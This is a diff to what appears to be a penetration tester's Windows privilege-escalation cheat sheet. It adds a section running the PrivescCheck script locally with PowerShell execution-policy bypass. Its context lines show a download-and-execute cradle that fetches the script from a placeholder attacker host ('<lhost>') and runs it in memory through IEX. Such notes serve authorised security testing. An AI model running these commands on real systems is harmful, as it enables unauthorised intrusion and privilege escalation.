@@ -114,6 +114,13 @@ https://github.com/itm4n/PrivescCheck
 (new-object system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
 ```
 
+## privesccheck - local
+https://github.com/itm4n/PrivescCheck
+
+```powershell
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+```
+
 ## powershell view assemblies
 ```powershell
 [appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
